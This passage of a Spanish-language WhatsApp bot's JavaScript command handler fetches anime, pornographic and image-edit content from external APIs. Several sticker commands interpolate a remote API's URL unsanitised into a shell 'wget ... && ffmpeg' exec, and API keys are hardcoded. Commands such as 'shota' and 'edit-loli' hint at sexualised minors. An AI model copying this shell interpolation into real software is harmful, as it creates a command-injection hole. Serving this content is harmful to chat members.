              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐌𝐚𝐝𝐚𝐫𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'mikasa':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/mikasa-ackerman?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `mikasa`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐌𝐢𝐤𝐚𝐬𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'miku':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/miku?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `miku`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐌𝐢𝐤𝐮`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'minato':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/minato?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `minato`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐌𝐢𝐧𝐚𝐭𝐨`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'onepiece':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/onepiece?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `onepiece`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐎𝐧𝐞𝐏𝐢𝐞𝐜𝐞`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'nezuko':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/nezuko?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `nezuko`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐍𝐞𝐳𝐮𝐤𝐨`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'pokemon':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/pokemon?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `pokemon`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐏𝐨𝐤𝐞𝐦𝐨𝐧`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'ppcouple':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/ppcouple?apikey=${confukey}`)
yoiz = await getBuffer(anu.result.femenino)
yoizz = await getBuffer(anu.result.masculino)
cnf.sendMessage(from, yoiz, image, {quoted: mek, caption: 'Perfil Femenino'})								
cnf.sendMessage(from, yoizz, image, {quoted: mek, caption: 'Perfil Masculino'})								
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'sagiri':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/sagiri?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `sagiri`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐒𝐚𝐠𝐢𝐫𝐢`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'shina':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/shina?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `shina`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐒𝐡𝐢𝐧𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'shinka':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/shinka?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `shinka`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐒𝐡𝐢𝐧𝐤𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'shota':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/shota?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `shota`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐒𝐡𝐨𝐭𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'shizuka':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/shizuka?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `shizuka`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐒𝐡𝐢𝐳𝐮𝐤𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'touka':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/touka?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `touka`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐓𝐨𝐮𝐤𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'tsunade':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/tsunade?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `tsunade`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐓𝐬𝐮𝐧𝐚𝐝𝐞`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

//NSFW//

////////////////

case 'stickcum':
case 'scum':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isNsfw) return reply('「 ❗ 」La Funcion De Nsfw No Está Activa')
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/cum')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})	
          break

case 'stickhentai':	
	  
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isNsfw) return reply('「 ❗ 」La Funcion De Nsfw No Está Activa')
reply(mess.wait)
try {
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await getBuffer(`https://api.lolhuman.xyz/api/random2/classic?apikey=${lolh}`)			
            resi = await upload(anu)            
			exec(`wget ${resi} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)			
				cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			 } catch {
			 reply('Lo siento no pude realizar su pedido')
			 }
          break


case 'stickfeetg':
case 'sfeetg':
case 'stickfeet':
case 'feetg':

if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                

if (!isNsfw) return reply('「 ❗ 」La Funcion De Nsfw No Está Activa')
reply(mess.wait)
try {
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/feetg')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
	       } catch {
			 reply('Lo siento no pude realizar su pedido')
			 }
			break

case 'stickbj':
case 'stickblowjob':
case 'sbj':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isNsfw) return reply('「 ❗ 」La Funcion De Nsfw No Está Activa')
reply(mess.wait)
try {
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/bj')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			} catch {
			 reply('Lo siento no pude realizar su pedido')
			 }
			break

case 'stickpussy':
case 'spussy':
case 'pussysticker':
case 'stickerpussy':
if (!isNsfw) return reply('「 ❗ 」La Funcion De Nsfw No Está Activa')
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
reply(mess.wait)
try {
       ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/pussy')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			 } catch {
			 reply('Lo siento no pude realizar su pedido')
			 }			
			break

case 'stickneko':
case 'sneko':
case 'nekostick':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isNsfw) return reply('「 ❗ 」La Funcion De Nsfw No Está Activa')
reply(mess.wait)
try {
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/nsfw_neko_gif')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			} catch {
			 reply('Lo siento no pude realizar su pedido')
			 }

			break

case 'ass':
case 'ahegao':
case 'bdsm':
case 'blowjob':
case 'cuckold':
case 'cum':
case 'ero':
case 'femdom':
case 'foot':
case 'gangbang':
case 'glasses':
case 'hentai':
case 'jahy':
case 'masturbation':
case 'orgy':
case 'panties':
case 'pussy':
case 'thighs':
case 'yuri':
case 'neko4':
case 'yuri2':
if (!isGroup) return reply('esta función es solo para grupos')
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isNsfw) return reply(`La función Nsfw no está activa en este grupo\nPor favor escribe: ${prefix}nsfw 1\nPara activar`)
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/nsfw/${command}?apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `${command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐍𝐬𝐟𝐰`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
break

case  'trapnime':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`La función Nsfw no está activa en este grupo\nPor favor escribe: ${prefix}nsfw 1\nPara activar`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
buffer = await getBuffer(anu.url)
cnf.sendMessage(from, buffer, image, { quoted: mek})
break


case 'neko3':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/nsfw/neko?apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `neko3`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐍𝐬𝐟𝐰`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
break

case 'yaoi':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
yoiz = await getBuffer(`https://api-alc.herokuapp.com/api/nsfw/yaoi?apikey=${confukey}`)
buttons = [{buttonId: `yaoi`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐍𝐬𝐟𝐰`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
break


////////////////

//Encode&Decode 64

////////////////

case 'encode-64':
case 'decode-64':
case 'encode-32':
case 'decode-32':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
texto = args.join(" ")
anu = await fetchJson(`https://api-alc.herokuapp.com/api/encode-decode/${command}?text=${texto}&apikey=${confukey}`)
reply(anu.result)
break

////////////////

//SIMI//

////////////////

////////////////

//EDIT IMG//

////////////////

		case 'triggered':
		//case 'gay':
		case 'glass':
		case 'passed':
		case 'jail':
		case 'comrade':
		case 'green':
		case 'blue':
		case 'sepia':
		case 'wasted':
		case 'greyscale':
		case 'blurple2': 
		case 'blurple': 
		case 'red': 
		case 'invertgreyscale': 
		case 'invert':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
					var imgbb = require('imgbb-uploader')
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          					reply(mess.wait)
					owgi = await cnf.downloadMediaMessage(ger)
				    anu = await upload(owgi)
					anu4 = await getBuffer(`https://some-random-api.ml/canvas/${command}?avatar=${anu}`)
					cnf.sendMessage(from, anu4, image, {quoted: mek})								
					} else {
					reply(`Etiquetar una imagen con substitulo ${command} por favor`)
					}					
					break 

////////////////

//TEXTPRO//

////////////////

case 'halloween2':
case 'horror':
case 'game8bit':
case 'layered':
case 'glitch2':
case 'coolg':
case 'coolwg':
case 'realistic':
case 'space3d':
case 'gtiktok':
case 'stone':
case 'marvel':
case 'marvel2':
case 'pornhub':
case 'avengers':
case 'metalr':
case 'metalg':
case 'metalg2':
case 'halloween2':
case 'lion':
case 'wolf_bw':
case 'wolf_g':
case 'ninja':
case '3dsteel':
case 'horror2':
case 'lava':
case 'bagel':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (args.length < 1) return reply('Falta el texto')
 m = args.join(" ")
reply(mess.wait)
	    	try {
 m1 = m.split("|")[0];
 m2 = m.split("|")[1]; 
 textpro = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/${command}?apikey=${alphakey}&text=${m1}&text2=${m2}`)
				cnf.sendMessage(from, textpro, image, {quoted: mek})
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
				break  
				
////

case 'edit-loli':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (args.length < 1) return reply('Falta el texto')
const texty = args.join(" ")
reply(mess.wait)
	    	try {
let editloli = await getBuffer(`https://api-alc.herokuapp.com/api/edit/loli?texto=${texty}&apikey=ConfuMods`)
				cnf.sendMessage(from, editloli, image, {quoted: mek})
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
				break  
				
case 'edit-gura':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (args.length < 1) return reply('Falta el texto')
 m = args.join(" ")
reply(mess.wait)
	    	try {
let gura = await getBuffer(`https://api-alc.herokuapp.com/api/edit/gura?texto=${m}&apikey=ConfuMods`)
				cnf.sendMessage(from, gura, image, {quoted: mek})
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
				break  
		
				
				
	case 'edit-rem':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (args.length < 1) return reply('Falta el texto')
 m = args.join(" ")
reply(mess.wait)
	    	try {
let rem = await getBuffer(`https://api-alc.herokuapp.com/api/edit/rem?texto=${m}&apikey=ConfuMods`)
				cnf.sendMessage(from, rem, image, {quoted: mek})
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
				break 
/*
case 'edit-putin': 
case 'putin':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
		try {
		pp = await cnf.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		usuy = await getBuffer(pp)
		pporang = await upload(usuy)
		      } catch {
		pporang = 'https://i.ibb.co/Jpkgh86/IMG-20220306-WA0002.jpg'
		      }
reply(mess.wait)
	    	try {
let putin = await getBuffer(`https://api-alc.herokuapp.com/api/edit/putin?imagen=${pporang}&apikey=ConfuMods`)
				cnf.sendMessage(from, putin, image, {quoted: mek})
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
				break  
	*/			
				
case 'edit-hacker':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
reply(mess.wait)
try {
		try {
		pp = await cnf.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		usuy = await getBuffer(pp)
		pporang = await upload(usuy)
		      } catch {
		pporang = 'https://i.ibb.co/Jpkgh86/IMG-20220306-WA0002.jpg'
		      }
	    	
let hac = await getBuffer(`https://api-alc.herokuapp.com/api/edit/hacker?imagen=${pporang}&apikey=ConfuMods`)
				cnf.sendMessage(from, hac, image, {quoted: mek})
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
				break  
				
case 'edit-hacker2':
case 'hacker2':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
reply(mess.wait)
try {
		try {
		pp = await cnf.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		usuy = await getBuffer(pp)
		pporang = await upload(usuy)
		      } catch {
		pporang = 'https://i.ibb.co/Jpkgh86/IMG-20220306-WA0002.jpg'
		      }
	    	
let hact = await getBuffer(`https://api-alc.herokuapp.com/api/edit/hacker2?imagen=${pporang}&apikey=ConfuMods`)
				cnf.sendMessage(from, hact, image, {quoted: mek})
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
				break  				


case 'edit-delete':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
reply(mess.wait)
try {
		try {
		pp = await cnf.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		usuy = await getBuffer(pp)
		pporang = await upload(usuy)
		      } catch {
		pporang = 'https://i.ibb.co/Jpkgh86/IMG-20220306-WA0002.jpg'
		      }
	    	
let del = await getBuffer(`https://api-alc.herokuapp.com/api/edit/delete?imagen=${pporang}&apikey=ConfuMods`)
				cnf.sendMessage(from, del, image, {quoted: mek})
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
				break  				


case 'edit-kaneki':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (args.length < 1) return reply('Falta el texto')
 m = args.join(" ")
reply(mess.wait)
	    	try {
let kan = await getBuffer(`https://api-alc.herokuapp.com/api/edit/kaneki?texto=${m}&apikey=ConfuMods`)
				cnf.sendMessage(from, kan, image, {quoted: mek})
             } catch {
           reply('Lo siento ah ocurrido un error')
           }
				break  
				
case 'edit-nekoboy':
if (isBanned) return  reply(mess.banned)
